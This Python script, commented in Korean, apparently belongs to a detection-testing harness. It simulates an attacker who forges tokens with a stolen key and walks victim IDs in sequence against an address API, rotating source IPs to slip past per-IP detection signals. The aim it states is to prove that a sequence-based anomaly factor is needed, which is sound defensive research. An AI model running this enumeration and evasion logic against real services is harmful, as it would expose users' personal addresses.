"""
S5 — IP Pool 분산 + sub 순차 (어설픈 공격자).

행위:
- IP 풀에서 매 요청 random 추출 (단일 IP factor 회피)
- sub는 풀을 1회만 순차 enumeration (`VICTIM_SUB_START`부터 `VICTIM_COUNT`명)
- 매 호출마다 새 jti (key 탈취 가정, forge_token)

회피하는 신호:
- 단일 IP × 다수 sub (5분 윈도우 다양성) — 풀 분산으로 회피

회피하지 못하는 신호:
- **풀 합산 sub 단조 패턴** — 매 IP는 random sub처럼 보이지만, 글로벌 시퀀스를
  합치면 sub가 순차로 증가하는 게 보임
- F-FirstSeen-Sensitive (신규 IP × 민감 endpoint) → 발동 기대

핵심 메시지:
    "IP만 가렸지만 sub 시퀀스를 빠뜨린 어설픈 공격자". 글로벌 sub-시퀀스
    factor 필요성을 데이터로 입증하는 시나리오.

S4 / S5b와의 차이 (셋 다 각 사용자 정확히 1회 방문, 총 `VICTIM_COUNT`건):
    S4  — 단일 IP, sub 순차
    S5  — IP 분산,  sub 순차              ← 이 파일
    S5b — IP 분산,  sub random 비복원 추출

세 시나리오 모두 총 호출량(`VICTIM_COUNT`건)과 호출 방식이 동일. 다른 건
IP / sub 선택 전략뿐 — UBA factor 차이를 깨끗하게 비교하기 위한 통일된 구조.
"""
import os
import sys
import time
import random
import argparse
from pathlib import Path

from dotenv import load_dotenv

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT))

from lib.token_forge import forge_token
from lib.target_pool import get_sequential_pool
from lib.ip_pool import get_distributed_ips, COUPANG_IP_TO_ACCOUNT_RATIO
from lib.http_client import get_session, call_api

load_dotenv(_ROOT / ".env")


def run_s5(
    duration_minutes: float = None,
    ip_pool_size: int = None,
    interval: float = None,
):
    """
    Parameters
    ----------
    duration_minutes : 공격 지속 시간 (분). 주어지면 interval 자동 계산.
    ip_pool_size     : IP 풀 크기 (없으면 .env S5_IP_POOL_SIZE → 자동)
    interval         : 요청 간 sleep (초). 기본 1.0s (= S4 페이스, 분당 60건).
    """
    session = get_session()

    victims = get_sequential_pool()
    victim_count = len(victims)

    # IP 풀: 쿠팡 비율 기본 (계정 × 0.683, lib/ip_pool.COUPANG_IP_TO_ACCOUNT_RATIO)
    ip_pool_size = ip_pool_size or int(os.environ.get("S5_IP_POOL_SIZE", 0))
    if not ip_pool_size:
        ip_pool_size = max(2, round(victim_count * COUPANG_IP_TO_ACCOUNT_RATIO))

    ip_pool = get_distributed_ips(count=ip_pool_size)
    total_requests = victim_count  # 풀 1회 순회 = S4와 동일 호출량

    if duration_minutes is not None:
        interval = (duration_minutes * 60) / max(1, total_requests)
    elif interval is None:
        interval = 1.0  # S4와 동일 페이스 (분당 60건)
    eta_min = total_requests * interval / 60

    rng = random.Random()

    print(f"[S5] === IP Pool 분산 (sub 순차 1회 순회) ===")
    print(f"[S5]   victim pool   : {victim_count}명 ({victims[0]}~{victims[-1]})")
    print(f"[S5]   IP pool       : {ip_pool_size}개 (random per request)")
    print(f"[S5]   total requests: {total_requests:,}건 (풀 1회 순회)")
    print(f"[S5]   interval      : {interval:.3f}s  → eta {eta_min:.1f}min")
    print(f"[S5]   IP 샘플       : {ip_pool[:5]} ...")

    start_time = time.time()
    request_count = 0
    success_count = 0

    try:
        for victim_id in victims:
            # IP는 매 요청 random, sub는 순차 단조 증가
            src_ip = rng.choice(ip_pool)
            token = forge_token(victim_id)

            try:
                resp = call_api(
                    session,
                    f"/api/addresses/{victim_id}",
                    token,
                    src_ip=src_ip,
                )
                request_count += 1
                if resp.status_code == 200:
                    success_count += 1

                if request_count % 60 == 0:
                    progress = (request_count / total_requests) * 100
                    elapsed = (time.time() - start_time) / 60
                    print(
                        f"[S5] {progress:5.1f}%  "
                        f"req={request_count:,}/{total_requests:,}  "
                        f"ok={success_count:,}  sub={victim_id}  "
                        f"elapsed={elapsed:.1f}min"
                    )
            except Exception as e:
                print(f"[S5] error sub={victim_id} ip={src_ip}: {e}")

            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[S5] 사용자 중단")

    avg_per_ip = request_count / max(1, ip_pool_size)
    print(
        f"[S5] 종료 — 총 {request_count:,} 요청, {success_count:,} 성공"
    )
    print(
        f"[S5] 분포 — 계정당 1건(결정론), IP당 평균 {avg_per_ip:.1f}건"
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--duration", type=float, default=None,
                        help="공격 지속 시간 (분). 주어지면 페이스 자동 계산.")
    parser.add_argument("--ip-pool-size", type=int, default=None,
                        help="IP 풀 크기 (기본: 계정 풀 × 0.68)")
    parser.add_argument("--interval", type=float, default=None,
                        help="요청 간 sleep (초). 기본 1.0s (S4와 동일 페이스).")
    args = parser.parse_args()
    run_s5(
        args.duration,
        args.ip_pool_size,
        args.interval,
    )
